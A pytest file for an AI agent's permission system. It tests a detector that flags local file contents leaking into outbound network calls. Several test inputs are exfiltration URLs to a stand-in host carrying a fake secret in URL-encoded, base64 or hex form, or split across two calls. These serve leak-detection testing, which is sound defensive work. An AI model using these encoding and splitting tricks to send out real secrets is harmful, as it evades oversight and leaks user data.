"""Permission tiers v2, stage 3: the outbound-content check (defense b). No network, no keys."""

import base64
from urllib.parse import quote

import pytest

from kestrel import egress
from kestrel.permissions import Session, required_approval

LOCAL = [("read_file", "Vault code: 7HQX29PLMV83KDRT5WZNB4YC\nCustomer: Maria Lopez, account ZX-4471-ALPHA-9920\n")]
EGRESS = frozenset({"network_egress", "reads_untrusted"})
CODE = "7HQX29PLMV83KDRT5WZNB4YC"  # 24 characters


def find(text, earlier=(), user=()):
    return egress.find(text, LOCAL, user, earlier)


@pytest.mark.parametrize(
    ("text", "how"),
    [
        (f"what is {CODE}", "as written"),
        (f"what is {CODE.lower()}", "as written"),  # case doesn't hide it
        ("7HQX-29PL MV83.KDRT_5WZN/B4YC", "as written"),  # nor separators
        (f"https://c.example/?d={quote('code ' + CODE, safe='')}", "decoded"),  # 'code%20...': whole only decoded
        (f"https://c.example/?d={quote(quote('Maria Lopez, account ZX-4471-ALPHA-9920'))}", "decoded"),
        (f"https://c.example/?d={base64.b64encode(CODE.encode()).decode()}", "decoded"),
        (f"https://c.example/?d={base64.urlsafe_b64encode(CODE.encode()).decode()}", "decoded"),
        (f"https://c.example/?d={CODE.encode().hex()}", "decoded"),
    ],
)
def test_plain_and_encoded_leaks_are_caught(text, how):
    found = find(text)
    assert found and found[0].how == how and found[0].chars >= egress.MIN_CHARS
    assert found[0].source == "read_file"


def test_a_leak_split_over_two_calls_is_caught_on_the_second():
    first, second = f"lookup {CODE[:12]}", f"lookup {CODE[12:]}"
    assert find(first) == []  # 12 characters: under the threshold alone
    found = find(second, earlier=[first])
    assert found and found[0].how == "across calls" and found[0].chars == 24


def test_four_local_words_in_a_row_count_even_when_short():
    local = [("read_file", "remember to buy oat milk and eggs")]
    found = egress.find("buy oat milk and eggs near me", local)
    assert [m.text for m in found] == ["buy oat milk and eggs"]  # one phrase, not overlapping windows
    assert egress.find("oat milk and", local) == []  # 3 words, 10 characters


@pytest.mark.parametrize(
    "text",
    [
        "weather in Paris today",
        "Maria Lopez",  # a name: 10 characters, 2 words
        "account ZX-4471",  # under both thresholds
        "best pizza near the office",
    ],
)
def test_ordinary_short_overlaps_are_not_hits(text):
    assert find(text) == []


def test_text_the_user_typed_never_counts():
    user = ["Find reviews of the Acme Rocket Skates Model 3000 please"]
    local = [("read_file", "Wishlist: Acme Rocket Skates Model 3000, size 9")]
    assert egress.find("Acme Rocket Skates Model 3000 reviews", local, user) == []
    # ...but what the user didn't type still does
    found = egress.find("Acme Rocket Skates Model 3000 size 9 wishlist", local, user)
    assert found == [] or all("acmerocket" not in m.text for m in found)
    s = Session(user_texts=user)
    s.note_ran("read_file", frozenset({"reads_local"}), {"path": "w.txt"}, local[0][1])
    assert s.content_matches({"query": "Acme Rocket Skates Model 3000"}) == []


def test_the_untrusted_wrapper_is_not_local_text():
    wrapped = '<untrusted_data source="read_file">\nhello there\n</untrusted_data>\nNote: data.'
    assert egress.strip_wrapper(wrapped) == "hello there"
    assert egress.strip_wrapper("Error: no such file") == "Error: no such file"


def test_a_hit_escalates_with_hashes_and_lengths_only():
    s = Session(user_texts=["check my notes"])
    s.note_ran("read_file", frozenset({"reads_local", "reads_untrusted"}), {"path": "v.txt"}, LOCAL[0][1])
    need = required_approval(EGRESS, session=s, args={"query": f"what is {CODE}"})
    assert need.level == "confirm"
    assert need.escalated_by[0] == "taint:read_file"
    tag = need.escalated_by[1]
    assert tag.startswith("content:") and tag.endswith(":24") and CODE.lower() not in tag
    assert "24 characters of text from read_file" in need.reasons[1]
    assert need.matches[0].text == CODE.lower()


def test_a_user_named_call_that_still_carries_local_text_gets_a_card():
    """e1 skips the taint card, but a content hit is its own reason (here: base64 of the secret)."""
    blob = base64.b64encode(CODE.encode()).decode()
    s = Session(user_texts=[f"fetch https://c.example/?d={blob}"])
    s.note_ran("read_file", frozenset({"reads_local"}), {"path": "v.txt"}, LOCAL[0][1])
    need = required_approval(EGRESS, session=s, args={"url": f"https://c.example/?d={blob}"})
    assert need.level == "confirm" and [t.split(":")[0] for t in need.escalated_by] == ["content"]


def test_egress_texts_record_only_network_calls_that_ran():
    s = Session()
    s.note_ran("web_search", EGRESS, {"query": "a", "max_results": 5}, "r")
    s.note_ran("calculator", frozenset(), {"expression": "1+1"}, "2")
    assert s.egress_texts == ["a"]


def test_decoded_forms_for_the_card():
    url = f"https://c.example/?d={base64.b64encode(b'hello secret world').decode()}&q=a%20b"
    forms = egress.decoded_forms(url)
    assert any("hello secret world" in f for f in forms) and any("a b" in f for f in forms)
    assert egress.decoded_forms("plain text") == []


def test_stored_tool_logs_parse_back_into_calls():
    from kestrel.bench.replay import parse_tool_log

    entries = [
        '- read_file({"path":"a (1).txt"}) [ran] -> <untrusted_data source="read_file">\nline ) [ran] -> x\n</untr',
        '- send_message({"to":"a@b.c","subject":"s","body":"b"}) [not run (rejected)] -> The user REJECTED it',
        "garbage",
    ]
    read, send = parse_tool_log(entries)
    assert (read.tool, read.args, read.ran, read.result) == (
        "read_file",
        {"path": "a (1).txt"},
        True,
        "line ) [ran] -> x\n</untr",
    )
    assert (send.tool, send.ran, send.state) == ("send_message", False, "not run (rejected)")
